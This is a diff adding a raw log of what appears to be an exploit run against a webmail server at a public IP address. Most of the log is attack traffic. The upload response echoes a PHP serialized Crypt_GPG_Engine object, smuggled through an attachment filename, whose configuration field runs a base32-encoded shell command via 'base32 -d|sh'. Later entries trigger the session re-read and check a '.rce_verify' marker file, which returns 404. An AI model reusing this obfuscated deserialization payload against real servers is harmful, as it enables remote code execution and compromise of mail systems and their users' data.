+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-DNS-Prefetch-Control": "off",
+    "Referrer-Policy": "same-origin",
+    "X-Frame-Options": "sameorigin",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "1989",
+    "Connection": "close"
+  },
+  "resp_body_first_2000": "{\"action\":\"upload\",\"unlock\":\"upload1337\",\"exec\":\"this.add2attachment_list(\\\"rcmfile21787101848064106700\\\",{\\\"html\\\":\\\"|O:16:&quot;Crypt_GPG_Engine&quot;:3:{s:8:&quot;_process&quot;;b:0;s:8:&quot;_gpgconf&quot;;s:727:&quot;echo &quot;NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDIN22FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTANBXLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTEN5XGKIBSHYTDC===&quot;|base32 -d|sh &amp;#&quot;;s:8:&quot;_homedir&quot;;s:0:&quot;&quot;;};\\\",\\\"name\\\":\\\"|O:16:\\\\\\\"Crypt_GPG_Engine\\\\\\\":3:{s:8:\\\\\\\"_process\\\\\\\";b:0;s:8:\\\\\\\"_gpgconf\\\\\\\";s:727:\\\\\\\"echo \\\\\\\"NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDIN22FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTANBXLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTEN5XGKIBSHYTDC===\\\\\\\"|base32 -d|sh &#\\\\\\\";s:8:\\\\\\\"_homedir\\\\\\\";s:0:\\\\\\\"\\\\\\\";};\\\",\\\"mimetype\\\":\\\"image/png\\\",\\\"classname\\\":\\\"image png\\\",\\\"complete\\\":true},\\\"upload1337\\\");\\n\"}"
+}
+
+=== [2026-08-19T01:10:49.207Z (UTC)] GET /?_task=mail (session re-read trigger) ===
+{
+  "status": 200,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:10:48 GMT, Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Expires": "Wed, 19 Aug 2026 01:10:48 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-DNS-Prefetch-Control": "off",
+    "Referrer-Policy": "same-origin",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "37571",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:10:49.285Z (UTC)] VERIFY GET marker file ===
+{
+  "url": "http://13.125.104.131:30083/.rce_verify_20260819T011047Z.txt",
+  "status": 404,
+  "body": null
+}
+
+=== [2026-08-19T01:10:49.286Z (UTC)] RUN END ===
+done
